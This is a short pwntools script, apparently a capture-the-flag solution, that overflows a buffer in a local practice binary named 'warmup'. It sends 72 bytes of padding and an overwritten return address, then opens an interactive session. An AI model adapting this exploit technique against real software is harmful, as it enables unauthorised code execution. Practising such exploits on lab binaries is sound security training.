from pwn import *

padding = b"\x00"*72
gadget = p64(0x00000000004004a1)
address = p64(0x000000000040060d)

payload = padding
#payload += gadget
payload += address

p = gdb.debug('./warmup')
#p = process('./warmup')

p.readuntil(b">")
p.sendline(payload)

p.interactive()
